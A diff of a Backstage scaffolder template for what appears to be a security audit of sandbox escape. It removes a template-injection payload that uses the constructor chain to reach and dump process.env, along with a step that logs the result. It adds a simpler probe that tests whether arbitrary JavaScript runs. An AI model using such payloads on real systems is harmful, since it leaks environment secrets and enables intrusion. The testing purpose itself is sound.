@@ -1,32 +1,7 @@
-apiVersion: scaffolder.backstage.io/v1beta3
-kind: Template
-metadata:
-  name: ssti-sandbox-escape-test
-  # FIXED: Wrapped in quotes because of the colon
-  title: "Security Audit: Sandbox Escape"
-  description: "Testing if the isolated-vm sandbox can be bypassed."
-spec:
-  type: service
-  owner: security-audit
-  
-  parameters:
-    - title: Audit Details
-      properties:
-        name:
-          type: string
-          title: Audit Name
-          default: "Sandbox_Test_01"
-
-  steps:
-    - id: fetch
+- id: fetch
       action: fetch:template
       input:
         url: ./skeleton
         values:
-          # Payload to test for sandbox escape
-          leak: "{{ [].constructor.constructor('return process.env')() | dump }}"
-
-    - id: log-result
-      action: debug:log
-      input:
-        message: "Audit Result: {{ values.leak }}"
+          # Test if we can run ANY javascript
+          leak: "{{ range.constructor('return 1+1')() }}"
